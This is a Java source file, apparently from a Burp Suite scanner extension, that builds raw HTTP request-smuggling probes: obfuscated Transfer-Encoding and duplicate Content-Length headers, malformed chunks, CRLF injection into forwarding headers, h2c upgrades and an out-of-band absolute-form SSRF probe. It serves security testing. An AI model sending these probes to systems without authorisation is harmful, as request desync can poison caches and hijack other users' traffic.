package com.maciejgojny.desync.gen;

import com.maciejgojny.desync.Hypothesis;

import java.nio.charset.StandardCharsets;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

public class HypothesisGenerator {

    private String base = "/desync-check";
    private String smuggledPath = "/desync-check-smuggled";
    private String smuggledHost = "x";
    private String followupPath = "/desync-check-followup";
    private String smuggledAuthority = "";

    public void setBase(String v) { this.base = v; }
    public void setSmuggledPath(String v) { this.smuggledPath = v; }
    public void setSmuggledHost(String v) { this.smuggledHost = v; }
    public void setFollowupPath(String v) { this.followupPath = v; }
    public void setSmuggledAuthority(String v) { this.smuggledAuthority = v; }

    private static int blen(String s) {
        return s.getBytes(StandardCharsets.ISO_8859_1).length;
    }

    private static Hypothesis h(String id, String category, String raw, String followup, String expect) {
        return new Hypothesis(id, category, raw, followup, expect);
    }

    public List<Hypothesis> generate(int max) {
        List<Hypothesis> out = new ArrayList<>();
        AtomicInteger seq = new AtomicInteger(1);

        String smuggled = "GET " + smuggledPath + " HTTP/1.1\r\nHost: " + smuggledHost + "\r\n\r\n";
        String followup = "GET " + followupPath + " HTTP/1.1\r\nHost: {HOST}\r\nConnection: keep-alive\r\n\r\n";

        String[][] teVariants = {
            {"te-plain", "Transfer-Encoding: chunked"},
            {"te-space-before", "Transfer-Encoding : chunked"},
            {"te-tab-before", "Transfer-Encoding\t: chunked"},
            {"te-case", "TrAnSfEr-EnCoDiNg: ChUnKeD"},
            {"te-junk-suffix", "Transfer-Encoding: chunked, cow"},
            {"te-xprefix", "X-Transfer-Encoding: chunked"},
            {"te-double", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"},
            {"te-tab-val", "Transfer-Encoding:\tchunked"},
        };
        for (String[] v : teVariants) {
            String tag = v[0], te = v[1];
            String body = "0\r\n\r\n" + smuggled;
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\n" + te + "\r\n"
                    + "Content-Length: " + blen(body) + "\r\nConnection: keep-alive\r\n\r\n" + body;
            out.add(h(String.format("te-%s-%04d", tag, seq.getAndIncrement()), "te-obfuscation", raw, followup, "desync|anomaly"));
        }

        String[][] clPairs = {{"6", "0"}, {"0", "6"}, {"44", "0"}, {"0", "44"}};
        for (String[] p : clPairs) {
            String a = p[0], b = p[1];
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: " + a + "\r\nContent-Length: " + b + "\r\n"
                    + "Connection: keep-alive\r\n\r\n" + smuggled;
            out.add(h(String.format("cl-dup-%s-%s-%04d", a, b, seq.getAndIncrement()), "cl-duplicate", raw, followup, "desync|anomaly|reject"));
        }

        String smuggled44 = smuggled.length() >= 44 ? smuggled.substring(0, 44) : smuggled;
        String[][] chunkBodies = {
            {"chunk-ext", "2c;desync=x\r\n" + smuggled44 + "\r\n0\r\n\r\n"},
            {"chunk-badterm", Integer.toHexString(blen(smuggled)) + "\r\n" + smuggled + "\r\n0\r\n"},
            {"chunk-oversize", "ffff\r\n" + smuggled},
            {"chunk-zeropad", "00\r\n\r\n" + smuggled},
        };
        for (String[] c : chunkBodies) {
            String tag = c[0], body = c[1];
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\nTransfer-Encoding: chunked\r\n"
                    + "Connection: keep-alive\r\n\r\n" + body;
            out.add(h(String.format("%s-%04d", tag, seq.getAndIncrement()), "chunk-anomaly", raw, followup, "desync|anomaly|break"));
        }

        String normal = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: " + blen(smuggled) + "\r\n"
                + "Connection: keep-alive\r\n\r\n" + smuggled;
        out.add(h(String.format("lf-only-%04d", seq.getAndIncrement()), "line-ending", normal.replace("\r\n", "\n"), followup, "anomaly|reject"));
        out.add(h(String.format("cr-only-%04d", seq.getAndIncrement()), "line-ending", normal.replace("\r\n", "\r"), followup, "anomaly|reject"));
        out.add(h(String.format("bare-lf-header-%04d", seq.getAndIncrement()), "line-ending",
                "POST " + base + " HTTP/1.1\r\nHost: {HOST}\nTransfer-Encoding: chunked\r\n"
                        + "Connection: keep-alive\r\n\r\n0\r\n\r\n" + smuggled,
                followup, "desync|anomaly"));

        String[] pads = {"", "X-Pad: p\r\n\r\n"};
        for (String pad : pads) {
            String smug = smuggled + pad;
            int cl = blen(smug) + 1;
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: " + cl + "\r\n"
                    + "Connection: keep-alive\r\n\r\n" + smug;
            out.add(h(String.format("dangling-%s-%04d", pad.isEmpty() ? "bare" : "pad", seq.getAndIncrement()), "dangling-byte", raw, followup, "desync"));
        }

        String[] methods = {"POST", "PUT", "PATCH"};
        String[] paths = {"/", "/api", "/login", "/search", "/robots.txt"};
        for (String method : methods) {
            for (String p : paths) {
                String raw = method + " " + p + " HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: " + blen(smuggled) + "\r\n"
                        + "Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\n" + smuggled;
                String pTag = p.replaceAll("^/+|/+$", "");
                if (pTag.isEmpty()) pTag = "root";
                pTag = pTag.replace("/", "_");
                out.add(h(String.format("cl0-%s-%s-%04d", method.toLowerCase(), pTag, seq.getAndIncrement()), "cl0-desync", raw, followup, "desync"));
            }
        }

        String[][] dualTe = {
            {"te-chunked-identity", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"},
            {"te-identity-chunked", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"},
            {"te-chunked-cow", "Transfer-Encoding: chunked\r\nTransfer-Encoding: cow"},
            {"te-cow-chunked", "Transfer-Encoding: cow\r\nTransfer-Encoding: chunked"},
        };
        for (String[] v : dualTe) {
            String tag = v[0], te = v[1];
            String body = "0\r\n\r\n" + smuggled;
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\n" + te + "\r\n"
                    + "Content-Length: " + blen(body) + "\r\nConnection: keep-alive\r\n\r\n" + body;
            out.add(h(String.format("%s-%04d", tag, seq.getAndIncrement()), "te-te-dual", raw, followup, "desync|anomaly|reject"));
        }

        List<String[]> spc = new ArrayList<>();
        spc.add(new String[]{"http10", "GET " + smuggledPath + " HTTP/1.0\r\nHost: " + smuggledHost + "\r\n\r\n"});
        spc.add(new String[]{"absolute-form", "GET http://{HOST}" + smuggledPath + " HTTP/1.1\r\nHost: " + smuggledHost + "\r\n\r\n"});
        spc.add(new String[]{"no-host", "GET " + smuggledPath + " HTTP/1.1\r\n\r\n"});
        spc.add(new String[]{"bare-lf", "GET " + smuggledPath + " HTTP/1.1\nHost: " + smuggledHost + "\n\n"});
        spc.add(new String[]{"leading-ws", "\tGET " + smuggledPath + " HTTP/1.1\r\nHost: " + smuggledHost + "\r\n\r\n"});

        // OOB routing-confusion / SSRF probe. The authority is injected by the caller
        // (Burp Collaborator payload host, or a manually supplied host). When the
        // front-end resolves the absolute-form authority, it calls back out-of-band.
        if (smuggledAuthority != null && !smuggledAuthority.isEmpty()) {
            spc.add(new String[]{"absolute-form-oob", "GET http://" + smuggledAuthority + "/desync-check-spc-oob HTTP/1.1\r\nHost: " + smuggledHost + "\r\n\r\n"});
        }

        for (String[] s : spc) {
            String tag = s[0], sm = s[1];
            String body = "0\r\n\r\n" + sm;
            // Content-Length is emitted as {CL} and resolved by the replayer AFTER {HOST}
            // substitution, so the length stays byte-accurate even when the smuggled
            // request embeds {HOST} (e.g. the absolute-form variant).
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\nTransfer-Encoding: chunked\r\n"
                    + "Content-Length: {CL}\r\nConnection: keep-alive\r\n\r\n" + body;
            out.add(h(String.format("spc-%s-%04d", tag, seq.getAndIncrement()), "shared-parser-confusion", raw, followup, "desync|anomaly"));
        }

        String h2Settings = "AAMAAABkAAQAAP__AAIAAAAA";
        String[][] h2c = {{"basic", ""}, {"with-body", smuggled}};
        for (String[] v : h2c) {
            String tag = v[0], extra = v[1];
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: h2c\r\n"
                    + "Connection: Upgrade, HTTP2-Settings\r\nHTTP2-Settings: " + h2Settings + "\r\n"
                    + "Content-Length: " + blen(extra) + "\r\n\r\n" + extra;
            out.add(h(String.format("h2c-upgrade-%s-%04d", tag, seq.getAndIncrement()), "h2c-upgrade", raw, followup, "anomaly"));
        }

        for (String p : new String[]{base, "/"}) {
            String tag = p.replaceAll("^/+|/+$", "");
            if (tag.isEmpty()) tag = "root";
            tag = tag.replace("/", "_");
            out.add(new Hypothesis(
                    String.format("h2-native-%s-%04d", tag, seq.getAndIncrement()),
                    "h2-native",
                    "native H2 (H2.CL / H2.TE via binary engine) -> " + p,
                    null, "desync|anomaly", p, "h2"));
        }

        // The smuggled request is CRLF-injected into the header block right after a
        // client-controllable forwarding header, and carries its OWN Connection header so
        // nothing dangles past the single terminator. This is deliberately NOT a blank-line
        // separated pipeline: legal keep-alive pipelining would return two responses on any
        // server and read as a false "desync". A splicing front-end, however, may lift these
        // injected lines into the upstream request and desync.
        String smuggledCrlf = "GET " + smuggledPath + " HTTP/1.1\r\nHost: " + smuggledHost + "\r\nConnection: keep-alive\r\n\r\n";
        for (String hdr : new String[]{"X-Forwarded-Host", "X-Forwarded-Server", "Host"}) {
            String raw = "GET " + base + " HTTP/1.1\r\nHost: {HOST}\r\n"
                    + hdr + ": x\r\n" + smuggledCrlf;
            String hdrTag = hdr.toLowerCase().replace("-", "_");
            out.add(h(String.format("host-crlf-%s-%04d", hdrTag, seq.getAndIncrement()), "host-header-crlf", raw, followup, "desync|anomaly"));
        }

        String[][] trailerBodies = {
            {"te-in-trailer", "0\r\nTransfer-Encoding: chunked\r\n\r\n" + smuggled},
            {"cl-in-trailer", "0\r\nContent-Length: 0\r\n\r\n" + smuggled},
            {"smug-as-trailer", "0\r\n" + smuggled + "\r\n"},
        };
        for (String[] t : trailerBodies) {
            String tag = t[0], body = t[1];
            String raw = "POST " + base + " HTTP/1.1\r\nHost: {HOST}\r\nTransfer-Encoding: chunked\r\n"
                    + "Connection: keep-alive\r\n\r\n" + body;
            out.add(h(String.format("trailer-%s-%04d", tag, seq.getAndIncrement()), "chunked-trailers", raw, followup, "desync|anomaly"));
        }

        if (max > 0 && out.size() > max) {
            return stratifiedSample(out, max);
        }
        return out;
    }

    /**
     * Round-robin across categories so a small cap (e.g. the context-menu quick scan's
     * generate(20)) still samples every family. A plain front-truncation would only ever
     * reach the first few categories and never SPC/OOB, host-crlf, trailers or h2-native.
     */
    private static List<Hypothesis> stratifiedSample(List<Hypothesis> all, int max) {
        LinkedHashMap<String, ArrayDeque<Hypothesis>> byCategory = new LinkedHashMap<>();
        for (Hypothesis h : all) {
            byCategory.computeIfAbsent(h.category, k -> new ArrayDeque<>()).add(h);
        }
        List<Hypothesis> picked = new ArrayList<>(max);
        boolean progressed = true;
        while (picked.size() < max && progressed) {
            progressed = false;
            for (ArrayDeque<Hypothesis> queue : byCategory.values()) {
                if (!queue.isEmpty()) {
                    picked.add(queue.poll());
                    progressed = true;
                    if (picked.size() >= max) {
                        break;
                    }
                }
            }
        }
        return picked;
    }
}